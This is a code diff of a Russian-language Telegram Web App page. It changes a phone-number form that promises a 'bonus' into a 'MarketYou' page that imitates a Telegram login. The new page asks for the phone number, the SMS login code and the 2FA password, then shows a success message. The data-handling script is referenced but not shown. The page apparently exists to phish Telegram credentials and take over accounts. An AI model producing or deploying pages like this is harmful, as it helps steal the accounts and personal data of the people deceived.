@@ -1,57 +1,29 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Отправка номера</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <style>
-    body {
-      font-family: sans-serif;
-      background: #0e1013;
-      color: #fff;
-      text-align: center;
-      margin-top: 80px;
-    }
-    input {
-      width: 80%;
-      padding: 10px;
-      border-radius: 10px;
-      border: none;
-      margin-bottom: 15px;
-      font-size: 16px;
-      text-align: center;
-    }
-    button {
-      background: #2a9df4;
-      border: none;
-      color: #fff;
-      padding: 12px 25px;
-      border-radius: 10px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MarketYou - Вход</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
-  <h2>📱 Введите свой номер телефона</h2>
-  <p>Он нужен, чтобы подтвердить вашу личность и получить бонус.</p>
-  <input id="phone" placeholder="+79990000000" type="tel" />
-  <button onclick="sendPhone()">Отправить</button>
-
-  <script>
-    Telegram.WebApp.ready();
-
-    function sendPhone() {
-      const phone = document.getElementById("phone").value.trim();
-      if (!phone) {
-        alert("Введите номер телефона");
-        return;
-      }
-
-      Telegram.WebApp.sendData(JSON.stringify({ phone }));
-      Telegram.WebApp.close(); // закрывает окно после отправки
-    }
-  </script>
+    <div class="container">
+        <header>
+            <h1>Вход через Telegram</h1>
+        </header>
+        <main>
+            <button id="loginBtn" class="login-btn">Войти</button>
+            <div id="authForm" class="auth-form hidden">
+                <div class="loading" id="loadingSpinner"></div>
+                <input type="tel" id="phoneInput" placeholder="Введите номер телефона" class="input-field hidden">
+                <input type="text" id="codeInput" placeholder="SMS-код" class="input-field hidden">
+                <input type="password" id="2faInput" placeholder="Пароль 2FA" class="input-field hidden">
+                <button id="submitBtn" class="submit-btn hidden">Подтвердить</button>
+                <div id="successMsg" class="success hidden">✅ Авторизация успешна!</div>
+            </div>
+        </main>
+    </div>
+    <script src="script.js"></script>
 </body>
 </html>
